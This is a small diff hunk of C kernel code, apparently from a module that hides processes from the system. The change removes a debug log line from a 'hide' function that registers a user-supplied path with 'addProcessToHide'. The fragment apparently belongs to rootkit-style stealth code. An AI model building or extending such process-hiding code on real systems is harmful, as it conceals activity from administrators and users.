@@ -40,7 +40,6 @@ int hide(const char __user *path) {
   strcat(tempPath, _path);
   //      printk("%s",tempPath);
   result = addProcessToHide(tempPath);
-  printk("%s, %d\n", _path, result);
   kfree(_path);
   if(result == -ENOMEM) {
     kfree(tempPath);
